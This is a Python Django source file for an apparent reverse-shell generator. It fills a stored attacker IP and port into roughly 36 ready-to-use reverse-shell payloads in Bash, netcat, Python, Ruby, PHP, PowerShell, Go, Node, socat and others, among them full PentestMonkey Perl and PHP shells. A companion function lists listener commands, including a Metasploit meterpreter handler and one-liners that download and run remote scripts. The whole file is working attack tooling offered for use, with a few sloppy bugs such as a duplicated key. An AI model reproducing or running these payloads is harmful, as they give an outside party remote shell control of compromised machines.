from .models import IP, ShellType
from django.shortcuts import render
from datetime import timedelta
from django.db.models.functions import Now
import timespan
from datetime import datetime
from django.contrib import messages


def dataFunction(request):
    all_finale = IP.objects.filter().order_by('-id')[:1]

    for e in all_finale:
        pass    

    showResult = 'bash'
    if request.method == 'GET':
        showResult = request.GET.get('shelltype', 'bash')
        print('yes')
    else:
        print('not clicked any shell type')
        

    

    dic1 = {

            "1":
            {
                "id":"id_1",
                "name": "Bash -i",
                "command": "{2} -i >& /dev/tcp/{0}/{1} 0>&1".format(e.ipaddress,e.port,showResult),
            
            },
            "2":
            {
                "id":"id_2",
                "name": "Bash 196",
                "command": "0<&196;exec 196<>/dev/tcp/{0}/{1}; {2} <&196 >&196 2>&196".format(e.ipaddress,e.port,showResult),
            
            },
            "3":
            {
                "id":"id_3",
                "name": "Bash readline",
                "command": """exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do $line 2>&5 >&5; done""".format(e.ipaddress,e.port),
            
            },
            "4":
            {
                "id": "id_4",
                "name": "nc mkfifo",
                "command": """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{2} -i 2>&1|nc {0} {1} >/tmp/f""".format(e.ipaddress,e.port,showResult),
            
             },
             "5":
            {
                "id": "id_5",
                "name": "Bash 5",
                "command": "{2} -i 5<> /dev/tcp/{0}/{1} 0<&5 1>&5 2>&5".format(e.ipaddress,e.port,showResult),
                
            },
            "6":
            {
                "id": "id_6",
                "name": "Bash udp",
                "command": "{2} -i >& /dev/udp/{0}/{1} 0>&1".format(e.ipaddress,e.port,showResult),
                
            },
            "7":
            {
                "id":"id_7",
                "name": "Perl PentestMonkey",
                    "command": """#!/usr/bin/perl -w\\n# perl-reverse-shell - A Reverse Shell implementation in PERL\\n# Copyright (C) 2006 pentestmonkey@pentestmonkey.net\\n#\\n# This tool may be used for legal purposes only.  Users take full responsibility\\n# for any actions performed using this tool.  The author accepts no liability\\n# for damage caused by this tool.  If these terms are not acceptable to you, then\\n# do not use this tool.\\n#\\n# In all other respects the GPL version 2 applies:\\n#\\n# This program is free software; you can redistribute it and/or modify\\n# it under the terms of the GNU General Public License version 2 as\\n# published by the Free Software Foundation.\\n#\\n# This program is distributed in the hope that it will be useful,\\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\\n# GNU General Public License for more details.\\n#\\n# You should have received a copy of the GNU General Public License along\\n# with this program; if not, write to the Free Software Foundation, Inc.,\\n# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\\n#\\n# This tool may be used for legal purposes only.  Users take full responsibility\\n# for any actions performed using this tool.  If these terms are not acceptable to\\n# you, then do not use this tool.\\n#\\n# You are encouraged to send comments, improvements or suggestions to\\n# me at pentestmonkey@pentestmonkey.net\\n#\\n# Description\\n# -----------\\n# This script will make an outbound TCP connection to a hardcoded IP and port.\\n# The recipient will be given a shell running as the current user (apache normally).\\n#\\n\\nuse strict;\\nuse Socket;\\nuse FileHandle;\\nuse POSIX;\\nmy $VERSION = "1.0";\\n\\n# Where to send the reverse shell.  Change these.\\nmy $ip = '{0}';\\nmy $port = {1};\\n\\n# Options\\nmy $daemon = 1;\\nmy $auth   = 0; # 0 means authentication is disabled and any \\n      # source IP can access the reverse shell\\nmy $authorised_client_pattern = qr(^127\\\\.0\\\\.0\\\\.1$);\\n\\n# Declarations\\nmy $global_page = "";\\nmy $fake_process_name = "/usr/sbin/apache";\\n\\n# Change the process name to be less conspicious\\n$0 = "[httpd]";\\n\\n# Authenticate based on source IP address if required\\nif (defined($ENV{{'REMOTE_ADDR'}})) {{\\n cgiprint("Browser IP address appears to be: $ENV{{'REMOTE_ADDR'}}");\\n\\n    if ($auth) {{\\n     unless ($ENV{{'REMOTE_ADDR'}} =~ $authorised_client_pattern) {{\\n         cgiprint("ERROR: Your client isn't authorised to view this page");\\n           cgiexit();\\n       }}\\n    }}\\n}} elsif ($auth) {{\\n    cgiprint("ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access");\\n cgiexit(0);\\n}}\\n\\n# Background and dissociate from parent process if required\\nif ($daemon) {{\\n my $pid = fork();\\n    if ($pid) {{\\n      cgiexit(0); # parent exits\\n   }}\\n\\n setsid();\\n    chdir('/');\\n  umask(0);\\n}}\\n\\n# Make TCP connection for reverse shell\\nsocket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));\\nif (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {{\\n    cgiprint("Sent reverse shell to $ip:$port");\\n cgiprintpage();\\n}} else {{\\n   cgiprint("Couldn't open reverse shell to $ip:$port: $!");\\n    cgiexit();  \\n}}\\n\\n# Redirect STDIN, STDOUT and STDERR to the TCP connection\\nopen(STDIN, ">&SOCK");\\nopen(STDOUT,">&SOCK");\\nopen(STDERR,">&SOCK");\\n$ENV{{'HISTFILE'}} = '/dev/null';\\nsystem("w;uname -a;id;pwd");\\nexec({{"{2}"}} ($fake_process_name, "-i"));\\n\\n# Wrapper around print\\nsub cgiprint {{\\n my $line = shift;\\n    $line .= "<p>\\\\n\\n";\\n   $global_page .= $line;\\n}}\\n\\n# Wrapper around exit\\nsub cgiexit {{\\n    cgiprintpage();\\n  exit 0; # 0 to ensure we don't give a 500 response.\\n}}\\n\\n# Form HTTP response using all the messages gathered by cgiprint so far\\nsub cgiprintpage {{\\n    print "Content-Length: " . length($global_page) . "\\\\r\\r\\nConnection: close\\\\r sdfdf\\r\\r\\nContent-Type: text\\\\/html\\\\r\\\\n\\\\r\\\\n" . $global_page;\\n}}\\n""".format(e.ipaddress,e.port,showResult),
            
            },
            "8":
            {
                "id": "id_8",
                "name": "nc -e",
                "command": "nc {0} {1} -e {2}".format(e.ipaddress,e.port,showResult),
            
            },
            "9":
            {
                "id": "id_9",
                "name": "rustcat",
                "command": "rcat connect -s {2} {0} {1}".format(e.ipaddress,e.port,showResult),
           
            },
            "10":
            {
                "id": "id_10",
                "name": "BusyBox nc -e",
                "command": "busybox nc {0} {1} -e {2}".format(e.ipaddress,e.port,showResult),
            
            },
            "11":
            {
                "id": "id_11",
                "name": "Python #1",
                "command": """export RHOST="{0}";export RPORT={1};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{2}")'""".format(e.ipaddress,e.port,showResult),
            },
            "12":
            {
                "id": "id_12",
                "name": "Python #2",
                "command": """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("{2}")'""".format(e.ipaddress,e.port,showResult),
            },
            "13":
            {
                "id": "id_13",
                "name": "Python3 #1",
                "command": """export RHOST="{0}";export RPORT={1};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{2}")'""".format(e.ipaddress,e.port,showResult)
            },
            "14":
            {
                "id": "id_14",
                "name": "Python3 Windows",
                "command": """import os,socket,subprocess,threading;\\ndef s2p(s, p):\\n    while True:\\n        data = s.recv(1024)\\n        if len(data) > 0:\\n            p.stdin.write(data)\\n            p.stdin.flush()\\n\\ndef p2s(s, p):\\n    while True:\\n        s.send(p.stdout.read(1))\\n\\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\\ns.connect((\\"{0}\\",{1}))\\n\\np=subprocess.Popen([\\"{2}\\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)\\n\\ns2p_thread = threading.Thread(target=s2p, args=[s, p])\\ns2p_thread.daemon = True\\ns2p_thread.start()\\n\\np2s_thread = threading.Thread(target=p2s, args=[s, p])\\np2s_thread.daemon = True\\np2s_thread.start()\\n\\ntry:\\n    p.wait()\\nexcept KeyboardInterrupt:\\n    s.close()""".format(e.ipaddress,e.port,showResult),   
            },
            "15":
            {
                "id": "id_15",
                "name": "ruby #1",
                "command": """ruby -rsocket -e'spawn("{2}",[:in,:out,:err]=>TCPSocket.new("{0}",{1}))'""".format(e.ipaddress,e.port,showResult)
            },
            "15":
            {
                "id":"id_15",
                "name": "golang",
                "command": """echo 'package main;import"os/exec";import"net";func main(){{{{c,_:=net.Dial("tcp","{0}:{1}");cmd:=exec.Command("{2}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go""".format(e.ipaddress,e.port,showResult)
            },
            "16":
            {
                "id":"id_16",
                "name": "Java",
                "command": """r = Runtime.getRuntime();p = r.exec(["{2}","-c","exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]);p.waitFor();""".format(e.ipaddress,e.port,showResult)
            
            },
            "17":
            {
                "id": "id_17",
                "name": "Node js",
                "command": """(function(){{{{var net=require("net"),cp=require("child_process"),sh=cp.spawn("{2}",[]);var client=new net.Socket();client.connect({1},"{0}",function(){{{{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}}}});return /a/;}}}})();""".format(e.ipaddress,e.port,showResult)
            },
            "18":
            {
                "id": "id_18",
                "name": "Ruby",
                "command": """ruby -rsocket -e'f=TCPSocket.open("{0}",{1}).to_i;exec sprintf("{2} -i <&%d >&%d 2>&%d",f,f,f)'""".format(e.ipaddress,e.port,showResult)
            },
            "19":
            {
                "id": "id_19",
                "name": "Ruby",
                "command": """ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{0}","{1}");while(cmd=c.gets);IO.popen({2},"r"){{{{|io|c.print io.read}}}}end'""".format(e.ipaddress,e.port,showResult)
            },
            "20":
            {
                "id": "id_20",
                "name": "Ruby (Windows)",
                "command": """ruby -rsocket -e 'c=TCPSocket.new("{0}","{1}");while(cmd=c.gets);IO.popen({2},"r"){{{{|io|c.print io.read}}}}end'""".format(e.ipaddress,e.port,showResult)
            },
            "21":
            {
                "id": "id_21",
                "name": "telnet",
                "command": "TF=$(mktemp -u);mkfifo $TF && telnet {0} {1} 0<$TF | {2} 1>$TF".format(e.ipaddress,e.port,showResult),
            
            },
            "22":
            {
                "id": "id_22",
                "name": "zsh",
                "command": "zsh -c 'zmodload zsh/net/tcp && ztcp {0} {1} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'".format(e.ipaddress,e.port),
            },
            "23":
            {
                "id": "id_23",
                "name": "Awk",
                "command": """awk 'BEGIN {{s = "/inet/tcp/0/{0}/{1}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}' /dev/null""".format(e.ipaddress,e.port),
            },
            "24":
            {
                "id": "id_24",
                "name": "Dart",
                "command": """import 'dart:io';\\nimport 'dart:convert';\\n\\nmain() {{\\n  Socket.connect("{0}", {1}).then((socket) {{\\n    socket.listen((data) {{\\n      Process.start('{2}', []).then((Process process) {{\\n        process.stdin.writeln(new String.fromCharCodes(data).trim());\\n        process.stdout\\n          .transform(utf8.decoder)\\n          .listen((output) {{ socket.write(output); }});\\n      }});\\n    }},\\n    onDone: () {{\\n      socket.destroy();\\n    }});\\n  }});\\n}}""".format(e.ipaddress,e.port,showResult)
            },
            "25":
            {
                "id": "id_25",
                "name": "PHP PentestMonkey",
                "command": """<?php\\n// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php\\n// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\\n\\nset_time_limit (0);\\n$VERSION = \\"1.0\\";\\n$ip = '{0}';\\n$port = {1};\\n$chunk_size = 1400;\\n$write_a = null;\\n$error_a = null;\\n$shell = 'uname -a; w; id; {2} -i';\\n$daemon = 0;\\n$debug = 0;\\n\\nif (function_exists('pcntl_fork')) {{\\n\\t$pid = pcntl_fork();\\n\\t\\n\\tif ($pid == -1) {{\\n\\t\\tprintit(\\"ERROR: Can't fork\\");\\n\\t\\texit(1);\\n\\t}}\\n\\t\\n\\tif ($pid) {{\\n\\t\\texit(0);  // Parent exits\\n\\t}}\\n\\tif (posix_setsid() == -1) {{\\n\\t\\tprintit(\\"Error: Can't setsid()\\");\\n\\t\\texit(1);\\n\\t}}\\n\\n\\t$daemon = 1;\\n}} else {{\\n\\tprintit(\\"WARNING: Failed to daemonise.  This is quite common and not fatal.\\");\\n}}\\n\\nchdir(\\"/\\");\\n\\numask(0);\\n\\n// Open reverse connection\\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\\nif (!$sock) {{\\n\\tprintit(\\"$errstr ($errno)\\");\\n\\texit(1);\\n}}\\n\\n$descriptorspec = array(\\n   0 => array(\\"pipe\\", \\"r\\"),  // stdin is a pipe that the child will read from\\n   1 => array(\\"pipe\\", \\"w\\"),  // stdout is a pipe that the child will write to\\n   2 => array(\\"pipe\\", \\"w\\")   // stderr is a pipe that the child will write to\\n);\\n\\n$process = proc_open($shell, $descriptorspec, $pipes);\\n\\nif (!is_resource($process)) {{\\n\\tprintit(\\"ERROR: Can't spawn shell\\");\\n\\texit(1);\\n}}\\n\\nstream_set_blocking($pipes[0], 0);\\nstream_set_blocking($pipes[1], 0);\\nstream_set_blocking($pipes[2], 0);\\nstream_set_blocking($sock, 0);\\n\\nprintit(\\"Successfully opened reverse shell to $ip:$port\\");\\n\\nwhile (1) {{\\n\\tif (feof($sock)) {{\\n\\t\\tprintit(\\"ERROR: Shell connection terminated\\");\\n\\t\\tbreak;\\n\\t}}\\n\\n\\tif (feof($pipes[1])) {{\\n\\t\\tprintit(\\"ERROR: Shell process terminated\\");\\n\\t\\tbreak;\\n\\t}}\\n\\n\\t$read_a = array($sock, $pipes[1], $pipes[2]);\\n\\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\\n\\n\\tif (in_array($sock, $read_a)) {{\\n\\t\\tif ($debug) printit(\\"SOCK READ\\");\\n\\t\\t$input = fread($sock, $chunk_size);\\n\\t\\tif ($debug) printit(\\"SOCK: $input\\");\\n\\t\\tfwrite($pipes[0], $input);\\n\\t}}\\n\\n\\tif (in_array($pipes[1], $read_a)) {{\\n\\t\\tif ($debug) printit(\\"STDOUT READ\\");\\n\\t\\t$input = fread($pipes[1], $chunk_size);\\n\\t\\tif ($debug) printit(\\"STDOUT: $input\\");\\n\\t\\tfwrite($sock, $input);\\n\\t}}\\n\\n\\tif (in_array($pipes[2], $read_a)) {{\\n\\t\\tif ($debug) printit(\\"STDERR READ\\");\\n\\t\\t$input = fread($pipes[2], $chunk_size);\\n\\t\\tif ($debug) printit(\\"STDERR: $input\\");\\n\\t\\tfwrite($sock, $input);\\n\\t}}\\n}}\\n\\nfclose($sock);\\nfclose($pipes[0]);\\nfclose($pipes[1]);\\nfclose($pipes[2]);\\nproc_close($process);\\n\\nfunction printit ($string) {{\\n\\tif (!$daemon) {{\\n\\t\\tprint \\"$string\\\\n\\";\\n\\t}}\\n}}\\n\\n?>""".format(e.ipaddress,e.port,showResult),
                
            },
            "26":
            {
                "id": "id_26",
                "name": "curl",
                "command": """C='curl -Ns telnet://{0}:{1}'; $C </dev/null 2>&1 | {2} 2>&1 | $C >/dev/null""".format(e.ipaddress,e.port,showResult),   
            },
            "27":
            {
                "id": "id_27",
                "name": "PHP exec",
                "command": """php -r '$sock=fsockopen("{0}",{1});exec("{2} <&3 >&3 2>&3");'""".format(e.ipaddress,e.port,showResult),   
            },
            "28":
            {
                "id": "id_28",
                "name": "PHP shell_exec",
                "command": """php -r '$sock=fsockopen("{0}",{1});shell_exec("{2} <&3 >&3 2>&3");'""".format(e.ipaddress,e.port,showResult),   
            },
            "29":
            {
                "id": "id_29",
                "name": "PHP system",
                "command": """php -r '$sock=fsockopen("{0}",{1});system("{2} <&3 >&3 2>&3");'""".format(e.ipaddress,e.port,showResult),   
            },
            "30":
            {
                "id": "id_30",
                "name": "PHP passthru",
                "command": """php -r '$sock=fsockopen("{0}",{1});passthru("{2} <&3 >&3 2>&3");'""".format(e.ipaddress,e.port,showResult),   
            },
            "31":
            {
                "id": "id_31",
                "name": "PHP `",
                "command": """php -r '$sock=fsockopen("{0}",{1});`{2} <&3 >&3 2>&3`;'""".format(e.ipaddress,e.port,showResult),   
            },
            "32":
            {
                "id": "id_32",
                "name": "PHP popen",
                "command": """php -r '$sock=fsockopen("{0}",{1});popen("{2} <&3 >&3 2>&3", "r");'""".format(e.ipaddress,e.port,showResult),   
            },
            "33":
            {
                "id": "id_33",
                "name": "PHP proc_open",
                "command": """php -r '$sock=fsockopen("{0}",{1});$proc=proc_open("{2}", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'""".format(e.ipaddress,e.port,showResult),   
            },
            "34":
            {
                "id": "id_34",
                "name": "Windows ConPty",
                "command": """IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {0} {1}""".format(e.ipaddress,e.port),   
            },
            "35":
            {
                "id": "id_35",
                "name": "PowerShell #1",
                "command": """$LHOST = "{0}"; $LPORT = {1}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) {{ while ($NetworkStream.DataAvailable) {{ $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }}; if ($TCPClient.Connected -and $Code.Length -gt 1) {{ $Output = try {{ Invoke-Expression ($Code) 2>&1 }} catch {{ $_ }}; $StreamWriter.Write("$Output`n"); $Code = $null }} }}; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()""".format(e.ipaddress,e.port),   
            },
            "36":
            {
                "id": "id_36",
                "name": "socat #1",
                "command": """socat TCP:{0}:{1} EXEC:{2}""".format(e.ipaddress,e.port,showResult)
            },

        
    
    }
    return dic1


{}
def myListener():
    all_finale = IP.objects.filter().order_by('-id')[:1]
    for e in all_finale:
        pass

     

    dic1 = {

            "1":
            {
                "id":"id_1",
                "name": "nc",
                "type": "nc lnvp {0}".format(e.port)
            
            },
            "2":
            {
                "id":"id_2",
                "name": "nc freebsd",
                "type": "nc -lvn {0}".format(e.port),
               
            },
            "3":
            {
                "id":"id_3",
                "name": "busybox nc",
                "type": "busybox nc -lp {}".format(e.port),
            },
            "4":
            {
                "id":"id_4",
                "name": "ncat.exe",
                "type": "ncat.exe -lvnp {0}".format(e.ipaddress,e.port),
            },
            "5":
            {
                "id":"id_5",
                "name": "ncat (TLS)",
                "type": 'ncat --ssl -lvnp {0}'.format(e.ipaddress,e.port),
            },
            "6":
            {
                "id":"id_6",
                "name": "rlwrap + nc",
                "type": 'rlwrap -cAr nc -lvnp {0}'.format(e.ipaddress,e.port),
            },
            "7":
            {
                "id":"id_7",
                "name": "rustcat",
                "type": 'rcat listen {0}'.format(e.ipaddress,e.port),
            },
            "8":
            {
                "id":"id_8",
                "name": "pwncat",
                "type": 'python3 -m pwncat -lp {0}'.format(e.port),
            },
            "9":
            {
                "id":"id_9",
                "name": "windows ConPty",
                "type": 'stty raw -echo; (stty size; cat) | nc -lvnp {0}'.format(e.port),
            },
            "10":
            {
                "id":"id_10",
                "name": "socat",
                "type": 'socat -d -d TCP-LISTEN:{0} STDOUT'.format(e.port),
            },
            "11":
            {
                "id":"id_11",
                "name": "socat (TTY)",
                "type": 'socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{0}'.format(e.port),
            },
            "12":
            {
                "id":"id_12",
                "name": "powercat",
                "type": "powercat -l -p {0}".format(e.port)
            
            },
            "13":
            {
                "id":"id_13",
                "name": "msfconsole",
                "type": 'msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost {0}; set lport {1}; exploit"'.format(e.ipaddress,e.port)
            
            },
            "14":
            {
                "id":"id_14",
                "name": "hoaxshell",
                "type": 'python3 -c "$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)" -t cmd-curl -p {0}'.format(e.port)
            
            },
            
        }
    
    return dic1



def shellType():
    dic2 = {

            "1":
            {
                "id":"id_1",
                "name": "sh",
                "type": "sh"
            },
            "2":
            {
                "id": "id_2",
                "name": "bash",
                "type": "bash",
            },
            "3":
            {
                "id": "id_3",
                "name": "cmd",
                "type": "cmd",
            },
         }

    return dic2       
